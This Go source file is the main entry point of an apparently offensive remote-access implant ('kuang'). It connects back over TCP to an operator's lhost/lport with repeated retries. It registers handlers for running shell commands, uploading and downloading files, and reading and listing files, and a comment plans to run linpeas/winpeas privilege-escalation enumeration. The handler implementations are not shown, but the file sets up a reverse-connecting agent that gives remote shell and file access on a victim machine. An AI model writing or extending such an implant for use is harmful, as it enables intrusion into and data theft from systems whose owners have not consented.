package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"

	"konstantinovitz.com/kuang/internal/agent"
	"konstantinovitz.com/kuang/internal/commands"
)

func main() {
	// Define command-line flags
	lhost := flag.String("lhost", "0.0.0.0", "The local host IP address")
	lport := flag.String("lport", "9000", "The local port to connect to")

	// Parse the flags
	flag.Parse()

	// Use the flag values
	fmt.Printf("Starting agent on %s:%s\n", *lhost, *lport)

	// Create and start the agent with the specified lhost and lport
	agentTransport := &agent.TCPTransport{
		LHOST: *lhost,
		LPORT: *lport,
	}

	// TODO: detect OS and build correct CommandManager, ie. sysenum command runs lipeas on linux and winpeas on windows
	// TODO: note that this will increase the binary size compared to totally separate linux and windows builds, but who cares??
	cm := commands.NewCommandManager()
	cm.RegisterHandler("ping", commands.HandlePing)
	cm.RegisterHandler("download", commands.HandleDownloadFile)
	cm.RegisterHandler("upload", commands.HandleUploadFile)
	cm.RegisterHandler("cd", commands.HandleChangeDir)
	cm.RegisterHandler("cat", commands.HandleCat)
	cm.RegisterHandler("sh", commands.HandleRunShellCommand)
	cm.RegisterHandler("ls", commands.HandleLS)
	cm.RegisterHandler("mkdir", commands.HandleMakeDirectory)
	cm.RegisterHandler("pwd", commands.HandlePWD)
	cm.RegisterHandler("clear", commands.HandleClear)

	agent := &agent.Agent{
		Transport:      agentTransport,
		MaxRetries:     100,
		BaseDelay:      1,
		CommandManager: cm,
	}

	go func() {
		err := agent.Start()
		if err != nil {
			panic(err)
		}
	}()

	// Catch OS signals to gracefully shut down
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, os.Interrupt)

	<-sigs
	agent.Stop()
	fmt.Println("Agent stopped")
}
